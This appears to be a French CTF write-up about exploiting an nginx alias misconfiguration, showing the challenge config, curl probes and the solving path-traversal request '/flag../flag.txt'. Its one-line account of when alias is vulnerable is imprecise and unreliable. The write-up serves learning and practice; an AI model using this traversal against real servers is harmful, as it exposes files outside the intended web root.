## TAGS : #WEB #PATHTRAVERSAL

https://labs.hakaioffsec.com/nginx-alias-traversal/

Fichier de config nginx fourni : 
```worker_processes auto;
error_log stderr warn;
pid /run/nginx.pid;

events {
    worker_connections 1024;
}

http {
    include mime.types;
    default_type application/octet-stream;

    log_format main_timed '$remote_addr - $remote_user [$time_local] "$request" '
                          '$status $body_bytes_sent "$http_referer" '
                          '"$http_user_agent" "$http_x_forwarded_for" '
                          '$request_time $upstream_response_time $pipe $upstream_cache_status';

    access_log /dev/stdout main_timed;
    error_log /dev/stderr notice;

    keepalive_timeout 65;

    client_body_temp_path /tmp/client_temp;
    proxy_temp_path /tmp/proxy_temp_path;
    fastcgi_temp_path /tmp/fastcgi_temp;
    uwsgi_temp_path /tmp/uwsgi_temp;
    scgi_temp_path /tmp/scgi_temp;

    server {
        listen [::]:8080 default_server;
        listen 8080 default_server;
        server_name _;

        sendfile off;
        tcp_nodelay on;
        absolute_redirect off;

        location / {
            alias /var/www/html/;
        }

        location /flag {
            # First attempt to serve request as file, then
            # as directory, then fall back to index.php
            #try_files $uri $uri/ /index.php?q=$uri&$args;
            alias /var/www/html/flag/;
        }

    }
}
```

La partie interessante de la config se situe à la fin :
```
        location / {
            alias /var/www/html/;
        }

        location /flag {
            # First attempt to serve request as file, then
            # as directory, then fall back to index.php
            #try_files $uri $uri/ /index.php?q=$uri&$args;
            alias /var/www/html/flag/;
        }
```

Sur le site WEB, on essaye /flag puis on est redirigé sur Rick Astley, toujours un plaisir (non)
### <strong><font style="color:white"  font size=4px>🟡🔰Alias🔰🟡  </font></strong> 
Alias est vulnérable au attaque de type path traversal si il termine par un "**/**", ce qui est le cas ici 
![[Pasted image 20240308111912.png]]

curl http://ctf.hackinprovence.fr:33238/ -I 
* HTTP/1.1 200 OK

curl http://ctf.hackinprovence.fr:33238/flag -I
* HTTP/1.1 301 Moved Permanently


  # <strong><font style="color:red"  font size=6px>🔴🎯<u>FLAG</u>🔴🎯 </font></strong> 

`curl http://ctf.hackinprovence.fr:33238/flag../flag.txt `
